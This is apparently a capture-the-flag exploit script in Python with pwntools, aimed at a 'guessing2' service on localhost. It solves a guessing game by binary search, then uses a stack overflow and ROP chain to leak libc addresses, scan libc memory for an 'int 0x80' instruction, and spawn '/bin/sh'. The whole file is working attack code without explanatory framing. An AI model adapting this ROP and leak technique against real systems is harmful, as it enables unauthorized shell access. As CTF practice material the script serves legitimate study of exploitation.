#!/usr/bin/env python

import pwn
import sys

# offsets
srp_offset = 144

# Gadgets
ropnop = 0x080483d6
leaveret = 0x080485fb
popal = 0x080486d6
popebpret = 0x0804873b

# data addresses
data = 0x08049000
rop_buffer = data + 0x400

# PLT entries (jump to here)
gets_plt = 0x8048420
printf_plt = 0x8048410
puts_plt = 0x8048450

# GOT entries
printf_got = 0x8049a2c

# set up pwnlib so that it behaves nicely for us
pwn.context(terminal = ['tmux', 'splitw', '-l', '45'])

# custom breakpoint
breakpoints = [
        #ropnop,
        #popebpret,
    ]

def get_shell(t):
    # we need these things
    fn = 0x11111111
    envp = 0x22222222
    argv = 0x33333333
    int0x80 = 0x44444444

    # This is the beginning of our exploit

    buf  = ''
    buf += 'A' * (srp_offset - len(buf))
    # start by dumping printf in libc
    buf += pwn.p32(puts_plt)
    buf += pwn.p32(popebpret)
    buf += pwn.p32(printf_got)
    # somehow ask for more data
    buf += pwn.p32(gets_plt)
    buf += pwn.p32(popebpret)
    buf += pwn.p32(rop_buffer)
    buf += pwn.p32(leaveret)

    t.send(buf + '\n')

    printf_libc = pwn.u32(t.recv(1000)[:4])
    pwn.log.info('Found printf@libc: ' + hex(printf_libc))

    #printf_libc += 0xf76736fe - 0xf7606f10 - 10

    buffers = [rop_buffer, rop_buffer + 0x500]
    toggle = False
    libc_data = ''
    libc_csr = printf_libc

    pwn.log.info('Scanning for `int 0x80` in libc')
    while True:
        toggle = not toggle
        i = int(toggle)

        if libc_csr & 0xFF == 0x0a:
            #pwn.log.warning('Skipping dodgy byte at ' + hex(libc_csr))
            libc_csr += 1
            libc_data += '\x00'

        if (libc_csr >> 8) & 0xFF == 0x0a:
            #pwn.log.warning('Skipping dodgy bytes at ' + hex(libc_csr))
            new_csr = ((libc_csr >> 8) + 1) << 8
            bytes_skipped = new_csr - libc_csr
            libc_csr = new_csr
            libc_data += '\x00' * bytes_skipped

        #pwn.log.info('Dumping memory from ' + hex(libc_csr))

        buf  = ''
        buf += pwn.p32(ropnop) # popped into EBP
        # output the next chunk of data from libc
        buf += pwn.p32(puts_plt)
        buf += pwn.p32(popebpret)
        buf += pwn.p32(libc_csr)
        # read the next rop chain into the other buffer
        buf += pwn.p32(gets_plt)
        buf += pwn.p32(popebpret)
        buf += pwn.p32(buffers[i])
        # pivot to the other buffer
        buf += pwn.p32(leaveret)

        t.send(buf + '\n')

        read_data = t.recv(0x1000)
        libc_data += read_data
        libc_csr += len(read_data)

        syscall_offset = libc_data.find('\xcd\x80')
        if syscall_offset != -1:
            int0x80 = printf_libc + syscall_offset
            pwn.log.success('Found int 0x80 at ' + hex(int0x80))
            break

    # we have a valid pointer to an int 0x80 instruction
    binsh = '/bin/sh\x00'
    fn = data
    envp = fn + len(binsh)
    argv = envp + 4


    #     8 bytes     4 bytes     4 bytes           4 bytes
    # [/bin/sh\x00][   null   ][  argv pointer   ][ envp pointer]
    #   ^-------------------------|                   |
    #                 ^-------------------------------|

    syscall_args = [
            binsh,
            pwn.p32(0),
            pwn.p32(fn),
            pwn.p32(0),
        ]
    syscall_args = ''.join(syscall_args)

    buf  = ''
    buf += pwn.p32(ropnop) # get skipped!
    buf += pwn.p32(gets_plt)
    buf += pwn.p32(popebpret)
    buf += pwn.p32(data)
    buf += execve_syscall(fn, envp, argv, int0x80)

    t.send(buf + '\n')
    t.send(syscall_args + '\n')

def execve_syscall(fn, envp, argv, int0x80):
    payload  = ''
    payload += pwn.p32(popal)     # RET (pointer to POPAL RET instruction)
    payload += '0' * 4            # EDI (ignored)
    payload += '1' * 4            # ESI (ignored)
    payload += '2' * 4            # EBP (ignored)
    payload += '3' * 4            # ESP (ignored)
    payload += pwn.p32(fn)        # EBX (char* filename)
    payload += pwn.p32(envp)      # EDX (char** envp)
    payload += pwn.p32(argv)      # ECX (char** argv)
    payload += pwn.p32(0xb)       # EAX (syscall code)
    payload += pwn.p32(int0x80)   # SRP (pointer to 'int 0x80')
    return payload

def play_game(t):
    hi = 1000
    lo = 1

    pwn.log.info("Playing stupid guessing game ...")
    while True:
        guess = int((hi + lo) / 2)
        t.recvuntil(':> ')
        t.send("{0}\n".format(guess))

        line = t.recvline().strip()

        if not line:
            pwn.log.success('Answer was: {0}'.format(guess))
            break

        if 'higher' in line:
            lo = guess
        else:
            hi = guess

def r(path):
    with open(path, 'rb') as f:
        return f.read()

# Run the script
if __name__ == '__main__':

    #t = pwn.process('guessing2')
    t = pwn.remote('localhost', 1337)
    play_game(t)
    t.recvuntil('meeting: ')

    # GDB commands to fire on startup
    gdb_cmds = []
    gdb_cmds += ['break *' + hex(x) for x in breakpoints]
    gdb_cmds.append('c')

    #pwn.gdb.attach(t, execute = '\n'.join(gdb_cmds))

    get_shell(t)

    t.interactive()
    t.close()

